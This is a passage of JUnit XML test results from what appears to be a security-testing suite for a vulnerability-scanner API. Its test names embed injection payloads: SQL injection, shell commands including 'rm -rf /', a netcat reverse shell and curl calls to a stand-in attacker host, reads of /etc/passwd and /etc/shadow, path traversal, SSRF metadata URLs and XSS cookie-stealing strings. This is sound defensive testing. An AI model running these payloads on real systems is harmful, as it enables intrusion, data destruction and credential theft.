name="test_write_endpoints_return_json_content_type[/auth/login-POST]" time="0.039" /><testcase classname="tests.test_functional_api.TestFieldLevelContractChecks" name="test_write_endpoints_return_json_content_type[/devices/register-POST]" time="0.032" /><testcase classname="tests.test_functional_api.TestExtraFieldTolerance" name="test_scan_create_ignores_unknown_extra_fields" time="0.036" /><testcase classname="tests.test_functional_api.TestExtraFieldTolerance" name="test_device_register_ignores_unknown_extra_fields" time="0.041" /><testcase classname="tests.test_functional_api.TestExtraFieldTolerance" name="test_vulnerability_update_ignores_unknown_extra_fields" time="0.034" /><testcase classname="tests.test_functional_api.TestExtraFieldTolerance" name="test_login_ignores_unknown_extra_fields" time="0.589" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_remediation_response_field_is_a_string[remediation_id]" time="0.032" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_remediation_response_field_is_a_string[vuln_id]" time="0.032" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_remediation_response_field_is_a_string[status]" time="0.032" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_remediation_response_field_is_a_string[executive_summary]" time="0.031" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_vulnerability_response_field_is_a_string[vuln_id]" time="0.040" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_vulnerability_response_field_is_a_string[scan_id]" time="0.033" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_vulnerability_response_field_is_a_string[host]" time="0.031" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_vulnerability_response_field_is_a_string[severity]" time="0.031" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_vulnerability_response_field_is_a_string[status]" time="0.031" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_scan_active_testing_enabled_is_boolean_not_string" time="0.041" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_cve_definitions_list_entries_have_cve_id_when_present" time="0.039" /><testcase classname="tests.test_functional_api.TestMoreFieldLevelContractChecks" name="test_device_platform_response_is_lowercased" time="0.034" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass[' OR '1'='1]" time="0.035" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass['; DROP TABLE scans; --]" time="0.042" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass[' OR 1=1 --]" time="0.048" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass[admin'--]" time="0.040" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass[1' UNION SELECT NULL,NULL,NULL--]" time="0.040" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass['; SELECT pg_sleep(5); --]" time="0.040" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass[x' AND 1=(SELECT COUNT(*) FROM users); --]" time="0.042" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass[&quot; OR &quot;&quot;=&quot;]" time="0.050" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass['||'1'='1]" time="0.039" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass[\\'; DROP TABLE users; --]" time="0.039" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass[1; EXEC xp_cmdshell('dir')]" time="0.041" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass[' OR SLEEP(5)=']" time="0.039" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass['; WAITFOR DELAY '0:0:5'--]" time="0.047" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_target_does_not_crash_or_bypass[1=1' /*]" time="0.041" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash[' OR '1'='1]" time="0.040" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash['; DROP TABLE scans; --]" time="0.040" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash[' OR 1=1 --]" time="0.041" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash[admin'--]" time="0.048" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash[1' UNION SELECT NULL,NULL,NULL--]" time="0.041" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash['; SELECT pg_sleep(5); --]" time="0.043" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash[x' AND 1=(SELECT COUNT(*) FROM users); --]" time="0.041" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash[&quot; OR &quot;&quot;=&quot;]" time="0.043" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash['||'1'='1]" time="0.048" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash[\\'; DROP TABLE users; --]" time="0.041" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash[1; EXEC xp_cmdshell('dir')]" time="0.044" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash[' OR SLEEP(5)=']" time="0.040" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash['; WAITFOR DELAY '0:0:5'--]" time="0.041" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_payload_in_justification_does_not_crash[1=1' /*]" time="0.052" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_in_login_email_field_returns_clean_401_or_422" time="0.038" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_in_login_password_field_does_not_bypass_auth" time="0.302" /><testcase classname="tests.test_injection.TestSqlInjectionOnScanTarget" name="test_sqli_in_uuid_path_param_returns_422_not_500" time="0.032" /><testcase classname="tests.test_injection.TestCommandInjection" name="test_command_injection_payload_in_target_does_not_execute[; rm -rf /]" time="0.035" /><testcase classname="tests.test_injection.TestCommandInjection" name="test_command_injection_payload_in_target_does_not_execute[$(whoami)]" time="0.047" /><testcase classname="tests.test_injection.TestCommandInjection" name="test_command_injection_payload_in_target_does_not_execute[`id`]" time="0.039" /><testcase classname="tests.test_injection.TestCommandInjection" name="test_command_injection_payload_in_target_does_not_execute[| cat /etc/passwd]" time="0.039" /><testcase classname="tests.test_injection.TestCommandInjection" name="test_command_injection_payload_in_target_does_not_execute[&amp;&amp; curl attacker.qa/pwned]" time="0.040" /><testcase classname="tests.test_injection.TestCommandInjection" name="test_command_injection_payload_in_target_does_not_execute[target.com; nc -e /bin/sh attacker.qa 4444]" time="0.040" /><testcase classname="tests.test_injection.TestCommandInjection" name="test_command_injection_payload_in_target_does_not_execute[$(curl -s attacker.qa/x)]" time="0.049" /><testcase classname="tests.test_injection.TestCommandInjection" name="test_command_injection_payload_in_target_does_not_execute[target.com`reboot`]" time="0.041" /><testcase classname="tests.test_injection.TestCommandInjection" name="test_command_injection_payload_in_target_does_not_execute[target.com &amp; shutdown -h now]" time="0.040" /><testcase classname="tests.test_injection.TestCommandInjection" name="test_command_injection_payload_in_target_does_not_execute[target.com || cat /etc/shadow]" time="0.040" /><testcase classname="tests.test_injection.TestCommandInjection" name="test_target_starting_with_dash_does_not_crash_api" time="0.041" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_in_target_does_not_expose_files[../../../etc/passwd]" time="0.051" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_in_target_does_not_expose_files[..\\..\\..\\windows\\win.ini]" time="0.056" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_in_target_does_not_expose_files[....//....//etc/passwd]" time="0.040" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_in_target_does_not_expose_files[%2e%2e%2f%2e%2e%2fetc%2fpasswd]" time="0.041" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_in_target_does_not_expose_files[/etc/passwd]" time="0.041" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_in_target_does_not_expose_files[..%252f..%252fetc/passwd]" time="0.050" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_in_target_does_not_expose_files[..;/..;/etc/passwd]" time="0.041" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_in_target_does_not_expose_files[/proc/self/environ]" time="0.040" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_as_uuid_path_param_returns_422[../../../etc/passwd]" time="0.036" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_as_uuid_path_param_returns_422[..\\..\\..\\windows\\win.ini]" time="0.032" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_as_uuid_path_param_returns_422[....//....//etc/passwd]" time="0.037" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_as_uuid_path_param_returns_422[%2e%2e%2f%2e%2e%2fetc%2fpasswd]" time="0.030" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_as_uuid_path_param_returns_422[/etc/passwd]" time="0.029" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_as_uuid_path_param_returns_422[..%252f..%252fetc/passwd]" time="0.029" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_as_uuid_path_param_returns_422[..;/..;/etc/passwd]" time="0.030" /><testcase classname="tests.test_injection.TestPathTraversal" name="test_path_traversal_payload_as_uuid_path_param_returns_422[/proc/self/environ]" time="0.037" /><testcase classname="tests.test_injection.TestSsrfStyleTargets" name="test_ssrf_style_target_accepted_at_api_layer_but_flagged[169.254.169.254]" time="0.036" /><testcase classname="tests.test_injection.TestSsrfStyleTargets" name="test_ssrf_style_target_accepted_at_api_layer_but_flagged[http://169.254.169.254/latest/meta-data/]" time="0.042" /><testcase classname="tests.test_injection.TestSsrfStyleTargets" name="test_ssrf_style_target_accepted_at_api_layer_but_flagged[http://localhost:8000/admin/config]" time="0.041" /><testcase classname="tests.test_injection.TestSsrfStyleTargets" name="test_ssrf_style_target_accepted_at_api_layer_but_flagged[http://[::1]:22]" time="0.042" /><testcase classname="tests.test_injection.TestSsrfStyleTargets" name="test_ssrf_style_target_accepted_at_api_layer_but_flagged[file:///etc/passwd]" time="0.048" /><testcase classname="tests.test_injection.TestSsrfStyleTargets" name="test_ssrf_style_target_accepted_at_api_layer_but_flagged[0.0.0.0]" time="0.041" /><testcase classname="tests.test_injection.TestXssPayloadsStoredInertly" name="test_xss_payload_in_scan_target_stored_as_plain_text[&lt;script&gt;alert(1)&lt;/script&gt;]" time="0.041" /><testcase classname="tests.test_injection.TestXssPayloadsStoredInertly" name="test_xss_payload_in_scan_target_stored_as_plain_text[&lt;img src=x onerror=alert(1)&gt;]" time="0.038" /><testcase classname="tests.test_injection.TestXssPayloadsStoredInertly" name="test_xss_payload_in_scan_target_stored_as_plain_text[javascript:alert(document.cookie)]" time="0.039" /><testcase classname="tests.test_injection.TestXssPayloadsStoredInertly" name="test_xss_payload_in_scan_target_stored_as_plain_text[&lt;svg/onload=alert(1)&gt;]" time="0.048" /><testcase classname="tests.test_injection.TestXssPayloadsStoredInertly" name="test_xss_payload_in_remediation_reject_reason_stored_inertly[&lt;script&gt;alert(1)&lt;/script&gt;]" time="0.040" /><testcase classname="tests.test_injection.TestXssPayloadsStoredInertly" name="test_xss_payload_in_remediation_reject_reason_stored_inertly[&lt;img src=x onerror=alert(1)&gt;]" time="0.035" /><testcase classname="tests.test_injection.TestXssPayloadsStoredInertly" name="test_xss_payload_in_remediation_reject_reason_stored_inertly[javascript:alert(document.cookie)]" time="0.035" /><testcase classname="tests.test_injection.TestXssPayloadsStoredInertly" name="test_xss_payload_in_remediation_reject_reason_stored_inertly[&lt;svg/onload=alert(1)&gt;]" time="0.035" /><testcase classname="tests.test_injection.TestNoSqlInjectionNotApplicable" name="test_nosqli_style_payload_in_justification_treated_as_plain_text[{&quot;$gt&quot;: &quot;&quot;}]" time="0.043" /><testcase classname="tests.test_injection.TestNoSqlInjectionNotApplicable" name="test_nosqli_style_payload_in_justification_treated_as_plain_text[{&quot;$ne&quot;: null}]" time="0.040" /><testcase classname="tests.test_injection.TestNoSqlInjectionNotApplicable" name="test_nosqli_style_payload_in_justification_treated_as_plain_text[{&quot;$where&quot;: &quot;1==1&quot;}]" time="0.041" /><testcase classname="tests.test_injection.TestJwtHeaderInjection" name="test_jwt_alg_none_token_rejected" time="0.034" /><testcase classname="tests.test_injection.TestJwtHeaderInjection" name="test_jwt_with_tampered_payload_rejected" time="0.030" /><testcase classname="tests.test_input_validation.TestScanTargetValidation" name="test_target_blank_string_rejected" time="0.040" /><testcase classname="tests.test_input_validation.TestScanTargetValidation" name="test_target_whitespace_only_rejected" time="0.035" /><testcase classname="tests.test_input_validation.TestScanTargetValidation" name="test_target_at_max_length_255_accepted" time="0.035" /><testcase classname="tests.test_input_validation.TestScanTargetValidation" name="test_target_over_max_length_256_rejected" time="0.038" /><testcase classname="tests.test_input_validation.TestScanTargetValidation" name="test_target_missing_rejected" time="0.031" /><testcase classname="tests.test_input_validation.TestScanTargetValidation" name="test_target_common_valid_formats_accepted[example.com]" time="0.044" /><testcase classname="tests.test_input_validation.TestScanTargetValidation" name="test_target_common_valid_formats_accepted[sub.domain.example.com]" time="0.040" /><testcase classname="tests.test_input_validation.TestScanTargetValidation" name="test_target_common_valid_formats_accepted[192.168.1.1]" time="0.041" /><testcase classname="tests.test_input_validation.TestScanTargetValidation" name="test_target_common_valid_formats_accepted[192.168.1.0/24]" time="0.039" /><testcase classname="tests.test_input_validation.TestScanTargetValidation" name="test_target_common_valid_formats_accepted[localhost]" time="0.039" /><testcase classname="tests.test_input_validation.TestScanTargetValidation" name="test_target_common_valid_formats_accepted[xn--80akhbyknj4f.com]" time="0.048" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_justification_under_min_length_10_rejected[0]" time="0.037" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_justification_under_min_length_10_rejected[1]" time="0.031" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_justification_under_min_length_10_rejected[5]" time="0.031" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_justification_under_min_length_10_rejected[9]" time="0.033" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_justification_at_exactly_min_length_10_accepted" time="0.043" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_justification_whitespace_only_rejected_even_if_long_enough" time="0.037" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_justification_at_max_length_2000_accepted" time="0.035" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_justification_over_max_length_2001_rejected" time="0.036" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_authorization_confirmed_false_rejected_by_business_rule" time="0.031" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_authorization_confirmed_missing_rejected" time="0.039" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_authorization_confirmed_non_boolean_rejected[yes]" time="0.035" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_authorization_confirmed_non_boolean_rejected[true]" time="0.040" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_authorization_confirmed_non_boolean_rejected[1_0]" time="0.041" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_authorization_confirmed_non_boolean_rejected[1_1]" time="0.039" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_authorization_confirmed_non_boolean_rejected[None]" time="0.048" /><testcase classname="tests.test_input_validation.TestScanAuthorizationJustificationValidation" name="test_active_testing_enabled_defaults_to_false" time="0.035" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_fcm_token_under_min_length_rejected[]" time="0.037" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_fcm_token_under_min_length_rejected[short]" time="0.032" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_fcm_token_under_min_length_rejected[123456789]" time="0.032" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_fcm_token_whitespace_only_rejected" time="0.040" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_platform_invalid_values_rejected[windows]" time="0.032" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_platform_invalid_values_rejected[web]" time="0.032" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_platform_invalid_values_rejected[ANDROID]" time="0.036" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_platform_invalid_values_rejected[IOS]" time="0.035" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_platform_invalid_values_rejected[]" time="0.040" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_platform_invalid_values_rejected[linux]" time="0.032" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_platform_invalid_values_rejected[macos]" time="0.032" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_platform_valid_values_accepted[android]" time="0.036" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_platform_valid_values_accepted[ios]" time="0.035" /><testcase classname="tests.test_input_validation.TestDeviceRegisterValidation" name="test_fcm_token_missing_rejected" time="0.039" /><testcase classname="tests.test_input_validation.TestVulnerabilityUpdateValidation" name="test_status_missing_rejected" time="0.034" /><testcase classname="tests.test_input_validation.TestVulnerabilityUpdateValidation" name="test_status_empty_string_accepted_no_enum_enforced" time="0.036" /><testcase classname="tests.test_input_validation.TestVulnerabilityUpdateValidation" name="test_status_arbitrary_values_accepted_no_enum_enforced[not_a_real_status]" time="0.034" /><testcase classname="tests.test_input_validation.TestVulnerabilityUpdateValidation" name="test_status_arbitrary_values_accepted_no_enum_enforced[\U0001f525\U0001f525\U0001f525]" time="0.035" /><testcase classname="tests.test_input_validation.TestVulnerabilityUpdateValidation" name="test_status_arbitrary_values_accepted_no_enum_enforced[DROP TABLE vulnerabilities;]" time="0.044" /><testcase classname="tests.test_input_validation.TestVulnerabilityUpdateValidation" name="test_status_arbitrary_values_accepted_no_enum_enforced[&lt;script&gt;x&lt;/script&gt;]" time="0.035" /><testcase classname="tests.test_input_validation.TestRemediationRejectValidation" name="test_reject_reason_missing_rejected" time="0.032" /><testcase classname="tests.test_input_validation.TestRemediationRejectValidation" name="test_reject_reason_empty_string_accepted_no_min_length" time="0.034" /><testcase classname="tests.test_input_validation.TestUuidPathParamValidation" name="test_malformed_uuid_path_param_returns_422_not_500[not-a-uuid]" time="0.031" /><testcase classname="tests.test_input_validation.TestUuidPathParamValidation" name="test_malformed_uuid_path_param_returns_422_not_500[12345]" time="0.040" /><testcase classname="tests.test_input_validation.TestUuidPathParamValidation" name="test_malformed_uuid_path_param_returns_422_not_500['; DROP TABLE scans; --]" time="0.032" /><testcase classname="tests.test_input_validation.TestUuidPathParamValidation" name="test_malformed_uuid_path_param_returns_422_not_500[%20%20%20]" time="0.031" /><testcase classname="tests.test_input_validation.TestUuidPathParamValidation" name="test_malformed_uuid_path_param_returns_422_not_500[\U0001f680]" time="0.033" /><testcase classname="tests.test_input_validation.TestUuidPathParamValidation" name="test_well_formed_but_nonexistent_uuid_returns_404" time="0.033" /><testcase classname="tests.test_input_validation.TestFullNameFieldValidation" name="test_full_name_empty_string_accepted_no_min_length" time="0.311" /><testcase classname="tests.test_input_validation.TestFullNameFieldValidation" name="test_full_name_very_long_value_does_not_crash" time="0.306" /><testcase classname="tests.test_input_validation.TestFullNameFieldValidation" name="test_full_name_with_unicode_characters_accepted" time="0.305" /><testcase classname="tests.test_input_validation.TestNullByteAndEncodingEdgeCases" name="test_null_byte_in_target_does_not_crash" time="0.035" /><testcase classname="tests.test_input_validation.TestNullByteAndEncodingEdgeCases" name="test_extremely_long_justification_beyond_max_rejected_not_500" time="0.039" /><testcase classname="tests.test_input_validation.TestNullByteAndEncodingEdgeCases" name="test_unicode_homoglyph_target_does_not_crash" time="0.043" /><testcase classname="tests.test_input_validation.TestNullByteAndEncodingEdgeCases" name="test_extra_unknown_fields_in_register_body_are_ignored" time="0.527" /></testsuite></testsuites>